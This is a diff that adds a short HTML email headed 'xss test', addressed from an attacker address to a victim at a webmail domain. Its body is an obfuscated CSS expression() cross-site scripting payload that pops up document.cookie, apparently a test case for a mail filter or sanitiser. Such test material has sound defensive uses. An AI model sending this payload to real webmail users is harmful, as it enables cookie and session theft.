@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: xss test
+To: victim@sina.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<A target="_blank" STYLE="no\xss:noxss(&quot;*//*&quot;);xss:ex/*gg*//**/pression(if(window.x!=1){alert(document.cookie);window.x=1;})">document.cookie>
